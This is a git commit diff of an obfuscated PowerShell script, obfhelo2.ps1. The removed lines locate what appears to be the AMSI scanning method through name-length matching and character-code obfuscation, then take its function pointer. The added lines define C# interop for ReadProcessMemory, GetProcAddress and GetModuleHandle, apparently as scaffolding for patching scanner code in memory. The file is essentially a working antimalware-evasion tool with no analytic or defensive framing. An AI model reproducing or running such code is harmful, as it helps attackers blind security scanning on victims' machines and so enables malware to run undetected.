5cc442ade7357bbf72f7026582eefef39ef7e14d
kupzy <paoumlaut1@gmail.com>
2025-04-24 09:19:26 -0400

    Update obfhelo2.ps1

--- obfhelo2.ps1
+++ obfhelo2.ps1
@@ -1,34 +1,24 @@
-$eIav = [appdomain]::currentdomain.getassemblies()
-$eIav |
-  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
-    if($_.Location -ne $null){
-         $y = $_.FullName.Split(",")[0]
-         If($y.StartsWith('S') -And $y.EndsWith('n') -And $y.Length -eq 28) {
-                 $9X3 = $_.GetTypes()
-         }
-    }
+$src = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Runtime.CompilerServices;
+
+public class Q {
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+
+    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
+    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+
+    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
+    public static int N() { return 99; }
 }
+"@
 
-$9X3 |
-  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
-    if($_.Name -ne $null){
-         If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
-                 $zZgSyhcnK9ejdM = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
-         }
-    }
-}
-
-$zZgSyhcnK9ejdM |
-  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
-    if($_.Name -ne $null){
-         If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
-                 $MdySY3DAxkizWV6eKLJ2u = $_
-         }
-    }
-}
-
-[IntPtr] $KyxpqEV93Znd = $MdySY3DAxkizWV6eKLJ2u.MethodHandle.GetFunctionPointer()
-[IntPtr] $Mp2fPIj05mA = [APIs]::GetCurrentProcess()
-$XsplXHxDwe0mXoDsL1g8N1V8 = 0
-$jq8f = $false
-
+Add-Type $src
